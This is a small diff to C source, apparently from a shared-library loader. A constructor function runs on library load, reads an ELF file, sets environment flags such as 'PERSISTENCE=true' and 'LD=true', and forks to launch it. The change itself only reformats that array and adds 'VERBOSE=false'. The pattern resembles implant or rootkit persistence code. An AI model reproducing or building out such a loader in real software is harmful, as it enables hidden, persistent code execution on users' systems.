@@ -209,8 +209,12 @@ void __attribute__((constructor)) initLibrary(void) {
   fread(buf, size, 1, f);
   fclose(f);
   char *argv[] = {elf_path, NULL};
-  char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/tmp",
-                  "PERSISTENCE=true", "LD=true", NULL};
+  char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin",
+                  "HOME=/tmp",
+                  "PERSISTENCE=true",
+                  "LD=true",
+                  "VERBOSE=false",
+                  NULL};
 
   pid_t child = fork();
   // in child process
